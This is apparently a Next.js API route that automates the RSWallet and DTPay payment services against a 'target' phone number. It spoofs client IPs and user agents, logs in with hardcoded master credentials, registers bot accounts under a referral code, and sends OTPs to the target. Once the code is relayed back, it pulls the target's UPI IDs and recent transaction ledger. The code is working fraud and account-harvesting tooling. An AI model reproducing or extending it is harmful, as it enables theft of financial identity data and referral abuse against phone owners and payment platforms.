import { NextResponse } from 'next/server';
import { getDb } from '@/lib/mongodb';
import crypto from 'crypto';

// API Endpoints
const RS_BASE_URL = "https://api.rswallet-api.com/app";
const DT_BASE_URL = "https://dtpay.app/runner-api/runner/api/v1";

// DTPay Master Credentials
const DT_MASTER_PHONE = "7870873927";
const DT_MASTER_PWD = "123456";

// DTPay Channel Mappings (Amazon: 1, MobiKwik: 2, Freecharge: 3, Paytm: 9)
const DTPAY_CHANNELS = [1, 2, 3, 9];

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, token, loginToken, Signature, X-Forwarded-For, X-Real-IP, X-Runner-Token, X-App-Version, X-App-Version-Code',
};

function getRandomIP() {
  return Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
}

function getRandomUserAgent() {
  const uas = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36"
  ];
  return uas[Math.floor(Math.random() * uas.length)];
}

function sanitizePhone(phone: string): string {
  const cleaned = String(phone).replace(/\D/g, '');
  return cleaned.length > 10 ? cleaned.slice(-10) : cleaned;
}

function generateRSSignature(payload: Record<string, any>, sessionKey: string): string {
  const sortedKeys = Object.keys(payload).sort();
  const queryString = sortedKeys.map(key => `${key}=${payload[key]}`).join('&');
  const rawString = `${queryString}&${sessionKey}`;
  return crypto.createHash('md5').update(rawString).digest('hex');
}

function getStealthHeaders(token?: string, isDTPay: boolean = false) {
  const ip = getRandomIP();
  const headers: any = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json;charset=UTF-8",
    "User-Agent": getRandomUserAgent(),
    "X-Forwarded-For": ip,
    "X-Real-IP": ip,
  };

  if (isDTPay) {
    headers["X-App-Version"] = "1.1.13";
    headers["X-App-Version-Code"] = "17";
    if (token) headers["X-Runner-Token"] = token;
  } else if (token) {
    headers["token"] = token;
    headers["loginToken"] = token;
  }
  return headers;
}

export async function OPTIONS() {
  return new NextResponse(null, { status: 204, headers: CORS_HEADERS });
}

export async function POST(request: Request) {
  const logs: any[] = [];
  try {
    const body = await request.json();
    const action = body.action || "send-otp";
    const db = await getDb();

    if (action === "send-otp") {
      const rawMobile = body.phone;
      if (!rawMobile) return NextResponse.json({ code: 400, message: "Target Identity Required" }, { status: 200, headers: CORS_HEADERS });
      
      const targetMobile = sanitizePhone(rawMobile);
      const channelType = parseInt(body.channelType);
      const isDTPayFlow = body.engine === 'dtpay' || DTPAY_CHANNELS.includes(channelType);
      
      if (isDTPayFlow) {
        logs.push({ "Step 0: DTPay Stealth Bridge": `Initializing DTPay flow for Channel Type ${channelType}` });
        
        const loginResp = await fetch(`${DT_BASE_URL}/auth/login`, {
          method: 'POST',
          headers: getStealthHeaders(undefined, true),
          body: JSON.stringify({ phone: DT_MASTER_PHONE, password: DT_MASTER_PWD, countryCode: "+91" })
        }).then(r => r.json());

        logs.push({ "Step 1: DTPay Master Auth": loginResp });

        if (loginResp.code !== 0 || !loginResp.ok) {
          return NextResponse.json({ code: 400, message: loginResp.msg || "DTPay Auth Failed", logs }, { status: 200, headers: CORS_HEADERS });
        }

        const runnerToken = loginResp.data.token;
        const dtHeaders = getStealthHeaders(runnerToken, true);

        const otpResp = await fetch(`${DT_BASE_URL}/provider/sendOtp?ctType=${channelType}&account=${targetMobile}`, {
          method: 'POST',
          headers: dtHeaders,
          body: JSON.stringify({})
        }).then(r => r.json());

        logs.push({ "Step 2: DTPay OTP Dispatch": otpResp });

        if (otpResp.code === 0 && otpResp.ok) {
          const newSessionId = "DT_" + Math.random().toString(36).substring(7).toUpperCase();
          await db.collection('automation_sessions').insertOne({
            sessionId: newSessionId,
            runnerToken,
            channelType,
            targetMobile,
            engine: 'DTPay',
            createdAt: new Date()
          });
          return NextResponse.json({ code: 200, message: "OTP Dispatched via DTPay", sessionId: newSessionId, logs }, { status: 200, headers: CORS_HEADERS });
        }
        return NextResponse.json({ code: 400, message: otpResp.msg || "DTPay OTP Dispatch Error", logs }, { status: 200, headers: CORS_HEADERS });

      } else {
        logs.push({ "Step 0: Legacy Engine Bridge": `Initializing RSWallet flow for Channel Type ${channelType}` });
        
        const botPhone = ["6", "7", "8", "9"][Math.floor(Math.random() * 4)] + Math.floor(100000000 + Math.random() * 900000000).toString().substring(1);
        const password = "Bot" + Math.random().toString(36).substring(7) + "@1";

        await fetch(`${RS_BASE_URL}/auth/register`, {
          method: 'POST',
          headers: getStealthHeaders(),
          body: JSON.stringify({ phone: botPhone, password, referralCode: "0ealuckpbyno" })
        });

        const loginResp = await fetch(`${RS_BASE_URL}/auth/login`, {
          method: 'POST',
          headers: getStealthHeaders(),
          body: JSON.stringify({ phone: botPhone, password })
        }).then(r => r.json());

        logs.push({ "Step 1: Legacy Bot Auth": loginResp });

        if (loginResp.code !== 200) {
          return NextResponse.json({ code: 400, message: "Legacy Auth Failed", logs }, { status: 200, headers: CORS_HEADERS });
        }

        const { userId, loginToken, sessionKey } = loginResp.data;
        const authHeaders = getStealthHeaders(loginToken);

        const ts = Date.now();
        const pinPayload = { pinCode: "954073", ts, userId };
        const pinHeaders = { ...authHeaders, Signature: generateRSSignature(pinPayload, sessionKey) };
        await fetch(`${RS_BASE_URL}/secure/pin/bind`, { method: 'POST', headers: pinHeaders, body: JSON.stringify(pinPayload) });

        const otpPayload = { mobile: targetMobile, type: channelType, accountType: "1", ts: Date.now(), userId };
        const otpHeaders = { ...authHeaders, Signature: generateRSSignature(otpPayload, sessionKey) };
        const otpResp = await fetch(`${RS_BASE_URL}/bind/send/otp`, {
          method: 'POST',
          headers: otpHeaders,
          body: JSON.stringify(otpPayload)
        }).then(r => r.json());

        logs.push({ "Step 2: Legacy OTP Dispatch": otpResp });

        if (otpResp.code === 200) {
          const newSessionId = "RS_" + Math.random().toString(36).substring(7).toUpperCase();
          await db.collection('automation_sessions').insertOne({
            sessionId: newSessionId,
            userId,
            loginToken,
            sessionKey,
            requestId: otpResp.data.requestId,
            channelType,
            engine: 'Legacy',
            createdAt: new Date()
          });
          return NextResponse.json({ code: 200, message: "OTP Dispatched via Legacy", sessionId: newSessionId, logs }, { status: 200, headers: CORS_HEADERS });
        }
        return NextResponse.json({ code: 400, message: "Legacy OTP Dispatch Error", logs }, { status: 200, headers: CORS_HEADERS });
      }
    }

    if (action === "verify-otp") {
      const sessionId = body.sessionId;
      const otpCode = body.otp;
      const session = await db.collection('automation_sessions').findOne({ sessionId });
      
      if (!session) return NextResponse.json({ code: 400, message: "Session Expired" }, { status: 200, headers: CORS_HEADERS });

      if (session.engine === 'DTPay') {
        const { runnerToken, channelType: cType, targetMobile: tMob } = session;
        const dtHeaders = getStealthHeaders(runnerToken, true);

        const verifyResp = await fetch(`${DT_BASE_URL}/provider/verifyOtp?ctType=${cType}&account=${tMob}&otp=${otpCode}`, {
          method: 'POST',
          headers: dtHeaders,
          body: JSON.stringify({})
        }).then(r => r.json());

        logs.push({ "Step 3: DTPay OTP Verification": verifyResp });

        if (verifyResp.code === 0 && verifyResp.ok) {
          await fetch(`${DT_BASE_URL}/provider/completeLogin?ctType=${cType}&account=${tMob}`, {
            method: 'POST',
            headers: dtHeaders,
            body: JSON.stringify({})
          });
          
          const infoResp = await fetch(`${DT_BASE_URL}/provider/upiInfo?ctType=${cType}&account=${tMob}`, {
            method: 'POST',
            headers: dtHeaders,
            body: JSON.stringify({})
          }).then(r => r.json());

          logs.push({ "Step 4: DTPay Identity Extraction": infoResp });

          return NextResponse.json({ 
            code: 200, 
            message: "Identity Verified", 
            vpaList: infoResp.data?.upiInfos || [],
            logs 
          }, { status: 200, headers: CORS_HEADERS });
        }
        return NextResponse.json({ code: 400, message: verifyResp.msg || "Invalid OTP", logs }, { status: 200, headers: CORS_HEADERS });

      } else {
        const { userId, loginToken, sessionKey, requestId, channelType: cType } = session;
        const checkPayload = { code: otpCode, type: cType, requestId, ts: Date.now(), userId };
        const checkHeaders = { ...getStealthHeaders(loginToken), Signature: generateRSSignature(checkPayload, sessionKey) };
        
        const checkResp = await fetch(`${RS_BASE_URL}/bind/check/otp`, {
          method: 'POST',
          headers: checkHeaders,
          body: JSON.stringify(checkPayload)
        }).then(r => r.json());
        
        logs.push({ "Step 3: Legacy VPA Extraction": checkResp });

        if (checkResp.code === 200) {
          return NextResponse.json({ 
            code: 200, 
            message: "Verified", 
            vpaList: checkResp.data?.upiInfos || [],
            logs 
          }, { status: 200, headers: CORS_HEADERS });
        }
        return NextResponse.json({ code: 400, message: "Invalid OTP", logs }, { status: 200, headers: CORS_HEADERS });
      }
    }

    if (action === "fetch-upi-details" || action === "fetch-by-phone") {
      let runnerUpiId = body.runnerUpiId;
      const targetMobile = sanitizePhone(body.phone || "");
      
      // Step 1: DTPay Master Login to get token
      const loginResp = await fetch(`${DT_BASE_URL}/auth/login`, {
        method: 'POST',
        headers: getStealthHeaders(undefined, true),
        body: JSON.stringify({ phone: DT_MASTER_PHONE, password: DT_MASTER_PWD, countryCode: "+91" })
      }).then(r => r.json());

      if (loginResp.code !== 0 || !loginResp.ok) {
        return NextResponse.json({ code: 400, message: "Auth Error", logs }, { status: 200, headers: CORS_HEADERS });
      }

      const runnerToken = loginResp.data.token;
      const dtHeaders = getStealthHeaders(runnerToken, true);

      // If fetching by phone, we need to find the runnerUpiId first
      if (action === "fetch-by-phone") {
        if (!targetMobile) return NextResponse.json({ code: 400, message: "Phone required" }, { status: 200, headers: CORS_HEADERS });
        
        logs.push({ "Step 1: Fetch Global UPI List": "Requesting linked accounts..." });
        const listResp = await fetch(`${DT_BASE_URL}/upi/list`, {
          method: 'GET',
          headers: dtHeaders
        }).then(r => r.json());

        if (listResp.code === 0 && listResp.ok) {
          const match = listResp.data.find((u: any) => u.upiAccount.includes(targetMobile));
          if (match) {
            runnerUpiId = match.runnerUpiId;
            logs.push({ "Step 2: Account Resolved": `Found UPI ID: ${runnerUpiId} for ${targetMobile}` });
          } else {
            return NextResponse.json({ code: 404, message: "Account not linked to Runner", logs }, { status: 200, headers: CORS_HEADERS });
          }
        } else {
          return NextResponse.json({ code: 400, message: "List Fetch Failed", logs }, { status: 200, headers: CORS_HEADERS });
        }
      }

      // Final Step: Fetch Details
      logs.push({ "Step 3: Fetching Recent Bills": `Requesting ledger for runnerUpiId: ${runnerUpiId}` });
      const detailResp = await fetch(`${DT_BASE_URL}/upi/detail?runnerUpiId=${runnerUpiId}&limit=5`, {
        method: 'GET',
        headers: dtHeaders
      }).then(r => r.json());

      logs.push({ "Step 4: Final Payload": detailResp });

      return NextResponse.json({
        code: 200,
        message: detailResp.ok ? "Ledger Captured" : "Fetch Failed",
        data: detailResp.data,
        logs
      }, { status: 200, headers: CORS_HEADERS });
    }

  } catch (err: any) {
    return NextResponse.json({ code: 500, message: err.message, logs }, { status: 200, headers: CORS_HEADERS });
  }
}
